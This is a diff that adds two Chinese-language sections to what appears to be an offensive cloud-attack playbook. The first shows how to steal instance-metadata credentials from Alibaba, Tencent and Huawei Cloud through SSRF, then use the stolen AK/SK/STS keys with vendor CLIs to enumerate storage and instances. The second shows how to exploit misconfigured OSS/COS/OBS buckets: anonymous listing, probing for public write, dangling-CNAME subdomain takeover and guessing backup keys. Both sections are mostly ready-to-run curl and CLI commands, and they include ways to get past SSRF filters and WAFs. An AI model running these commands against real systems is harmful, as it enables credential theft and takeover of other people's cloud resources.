@@ -106,6 +106,81 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0d%0aHost:%2016
 
 ---
 
+### 国内云元数据窃取  `cn-cloud-metadata`
+利用SSRF访问阿里云/腾讯云/华为云实例元数据服务，获取 RAM/CAM 临时凭据（AccessKeyId/AccessKeySecret/SecurityToken 三元组），接管 OSS/COS 及云 API。国内 SRC 目标绝大多数跑在阿里云或腾讯云上，**这是国内场景里云链路的起点**。
+子类：**IMDS攻击(国内云)** · tags: `云安全` `SSRF` `阿里云` `腾讯云` `RAM` `CAM` `元数据`
+
+**前置条件：** 目标为国内云 ECS/CVM；存在 SSRF；实例绑定 RAM/CAM 角色
+
+**攻击链：**
+
+**1. 阿里云元数据探测**
+_主端点 100.100.100.200（旧实例也常绑 169.254.169.254）_
+```
+# 普通模式(实例未开强制 token)
+curl -s "https://{TARGET}/proxy?url=http://100.100.100.200/latest/meta-data/"
+
+# RAM 角色名 → 临时凭据(三元组)
+curl -s "https://{TARGET}/proxy?url=http://100.100.100.200/latest/meta-data/ram/security-credentials/"
+curl -s "https://{TARGET}/proxy?url=http://100.100.100.200/latest/meta-data/ram/security-credentials/{ROLE_NAME}"
+# 返回 AccessKeyId / AccessKeySecret / SecurityToken / Expiration
+
+# 强制模式(防盗版加固后)——先 PUT 换 token,再带 header 取数据
+curl -s "https://{TARGET}/proxy?url=http://100.100.100.200/latest/api/token" -X PUT -H "X-aliyun-ecs-metadata-token-ttl-seconds: 300"
+# ↑ SSRF 只能 GET 时,说明目标开了 IMDS 强制模式,单跳 SSRF 打不动 → 见"绕过变体"
+curl -s "https://{TARGET}/proxy?url=http://100.100.100.200/latest/meta-data/" -H "X-aliyun-ecs-metadata-token: {TOKEN}"
+
+# user-data(启动脚本里常见 AK/内网拓扑/密码)
+curl -s "https://{TARGET}/proxy?url=http://100.100.100.200/latest/user-data"
+```
+
+**2. 腾讯云元数据探测**
+_专用域名 metadata.tencentyun.com（解析到 169.254.169.254）_
+```
+curl -s "https://{TARGET}/proxy?url=http://metadata.tencentyun.com/latest/meta-data/"
+
+# CAM 角色凭据
+curl -s "https://{TARGET}/proxy?url=http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/"
+curl -s "https://{TARGET}/proxy?url=http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/{ROLE_NAME}"
+
+# IMDSv2 模式
+curl -s "https://{TARGET}/proxy?url=http://metadata.tencentyun.com/latest/api/token" -X PUT -H "X-tencent-cloud-metadata-token-ttl-seconds: 300"
+curl -s "https://{TARGET}/proxy?url=http://metadata.tencentyun.com/latest/meta-data/" -H "X-tencent-cloud-metadata-token: {TOKEN}"
+```
+
+**3. 华为云 / 通用 OpenStack 系**
+_华为云 CCM 基于 OpenStack,路径不同_
+```
+curl -s "https://{TARGET}/proxy?url=http://169.254.169.254/openstack/latest/meta_data.json"
+# 临时安全密钥(Huawei IMDSv2 需 X-Meta-Token,以官方文档为准)
+curl -s "https://{TARGET}/proxy?url=http://169.254.169.254/openstack/latest/securitykey"
+```
+
+**4. 凭据接管（三元组直接进 ossutil / aliyun CLI）**
+```
+# 阿里云: OSS 枚举 + ECS 横向
+aliyun configure set --access-key-id {AK} --access-key-secret {SK} --sts-token {ST} --region cn-hangzhou
+aliyun oss ls                       # 列全部 bucket
+aliyun ecs DescribeInstances        # 全量实例清单(内网地图)
+
+# 腾讯云: coscli / tccli 同理
+tccli cvm DescribeInstances
+```
+
+**WAF/EDR 绕过变体：**
+
+**1. 端点与变形**
+_阿里云端点不止一个,SSRF 过滤常漏_
+```
+http://100.100.100.200/latest/meta-data/       # 主端点
+http://169.254.169.254/latest/meta-data/       # 兼容端点
+http://[::ffff:100.100.100.200]/latest/meta-data/
+http://metadata.tencentyun.com/                # 腾讯(域名形式常被漏)
+```
+**2. IMDS 强制模式(token)的单跳困局**:PUT 换 token 无法经 GET 型 SSRF 完成——转向找**接受自定义 header 的转发点**(Webhook 配置、SSO 回调、http client 自定义 header 注入)或 **DNS 重绑定**(`100-100-100-200.nip.io` 类)+ 保持 POST 的客户端。打不动就承认,转 §cn-object-storage 从 bucket 侧突破。
+
+---
+
 ### S3存储桶配置错误利用  `cloud-s3-misconfig`
 利用AWS S3存储桶的访问控制配置错误(公开读/写/列举)获取敏感数据或植入恶意文件。常见于静态网站托管、日志存储和备份桶，可能导致数据泄露、网站篡改或供应链攻击。
 子类：**S3安全** · tags: `云安全` `S3` `AWS` `配置错误` `数据泄露`
@@ -208,6 +283,66 @@ aws s3 ls "s3://{BUCKET}" --profile any-aws-account
 # Signed URL泄露搜索
 # 在Google/GitHub搜索: "s3.amazonaws.com/{BUCKET}" "X-Amz-Signature"
 ```
+
+---
+
+### 国内对象存储错配  `cn-object-storage`
+利用阿里云 OSS / 腾讯云 COS / 华为云 OBS 桶的权限错配(匿名列举/公开读写/CNAME 悬挂接管)获取敏感数据或接管资源。国内静态资源/备份/日志几乎全在 OSS/COS 上，且 bucket 域名**外置在页面源码、App 抓包、JS 里**，黑盒无需 SSRF 即可打。
+子类：**对象存储安全** · tags: `云安全` `OSS` `COS` `OBS` `配置错误` `Bucket接管`
+
+**前置条件：** 已知 bucket 域名(源码/JS/抓包/子域)；或拿到 AK 已可枚举
+
+**攻击链：**
+
+**1. Bucket 发现与匿名列举**
+_OSS/COS 的匿名 GET 列举,多数错配连登录都不需要_
+```
+# 域名规律(也用于从资产反推)
+{BUCKET}.oss-{region}.aliyuncs.com        # 阿里 OSS
+{BUCKET}.cos.ap-{region}.myqcloud.com     # 腾讯 COS
+{BUCKET}.obs.{region}.myhuaweicloud.com   # 华为 OBS
+
+# 匿名列举(错配=公开读)
+curl -s "https://{BUCKET}.oss-cn-hangzhou.aliyuncs.com/?prefix=&max-keys=100"
+# 看返回 ListBucketResult 还是 AccessDenied
+
+# 关键前缀定向翻(备份/日志/上传目录)
+?prefix=backup/  ?prefix=log/  ?prefix=upload/  ?prefix=.env
+```
+
+**2. 公开写验证(只验不破坏)**
+_PUT 一个无害对象确认写权限,绝不覆盖既有文件_
+```
+curl -s -X PUT "https://{BUCKET}.oss-cn-hangzhou.aliyuncs.com/security-test-$(date +%s).txt" -d "poc" -I
+# 返回 200 = 匿名写(可挂马/篡改,P0);403 = 只读错配
+```
+
+**3. Bucket 接管(CNAME 悬挂)**
+_子域 CNAME 指向已释放的 bucket → 重建同名 bucket 即接管该子域_
+```
+# 找悬挂:资产测绘里 CNAME 指向 *.oss-*.aliyuncs.com 但原 bucket 404 NoSuchBucket
+dig ccdn.target.com  # → target-cdn.oss-cn-beijing.aliyuncs.com
+curl -s -I https://target-cdn.oss-cn-beijing.aliyuncs.com/ | grep -i "NoSuchBucket"
+# 去自己账号在同 region 重建同名 bucket + 绑 CNAME → 接管该子域(cookie 作用域内打)
+```
+
+**4. AK 拿到后的横向**
+_元数据/代码泄露拿到的 RAM AK 通常绑 OSS 权限_
+```
+ossutil ls -s                      # 列所有桶
+ossutil cat oss://{BUCKET}/config  # 直接读配置
+# 关注:数据库备份、小程序 code-secret、第三方 AK(再横向)
+```
+
+**WAF/EDR 绕过变体：**
+
+**1. 权限粒度绕过**
+_ListObjects 被禁但 GetObject 开放时,靠字典猜 key_
+```
+# 常见 key 字典:时间戳目录/日期分桶/{userid}/avatar、backup_YYYYMMDD.sql.gz
+curl -s -I "https://{BUCKET}.oss-cn-hangzhou.aliyuncs.com/2025/backup_db.sql.gz"
+```
+**2. STS 临时凭据混淆**:报错页/前端 SDK 配置里常见 `stsToken` 硬编码——前端可见的 STS 也是凭据,直接进 ossutil。
 
 ---
 
